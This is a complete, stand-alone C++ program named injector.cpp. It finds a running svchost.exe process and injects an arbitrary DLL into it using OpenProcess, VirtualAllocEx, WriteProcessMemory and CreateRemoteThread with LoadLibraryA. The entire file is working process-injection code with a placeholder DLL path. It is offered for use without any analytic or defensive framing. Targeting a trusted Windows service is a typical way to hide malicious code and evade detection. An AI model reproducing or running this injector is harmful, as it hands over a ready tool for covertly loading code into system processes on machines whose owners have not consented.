// injector.cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

DWORD GetSvchostPID() {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry)) {
        while (Process32Next(snapshot, &entry)) {
            if (_wcsicmp(entry.szExeFile, L"svchost.exe") == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}

bool InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, 
                                    MEM_COMMIT, PAGE_READWRITE);
    if (!pDllPath) {
        CloseHandle(hProcess);
        return false;
    }

    WriteProcessMemory(hProcess, pDllPath, dllPath, strlen(dllPath) + 1, NULL);

    HMODULE hKernel32 = GetModuleHandle(L"Kernel32");
    LPTHREAD_START_ROUTINE loadLibraryFunc = 
        (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                       loadLibraryFunc, pDllPath, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return true;
}

int main() {
    DWORD pid = GetSvchostPID();
    if (!pid) {
        std::cerr << "Could not find svchost process" << std::endl;
        return 1;
    }

    const char* dllPath = "C:\\path\\to\\your\\dll.dll";
    if (InjectDLL(pid, dllPath)) {
        std::cout << "DLL injected successfully!" << std::endl;
    } else {
        std::cerr << "Injection failed" << std::endl;
    }

    return 0;
}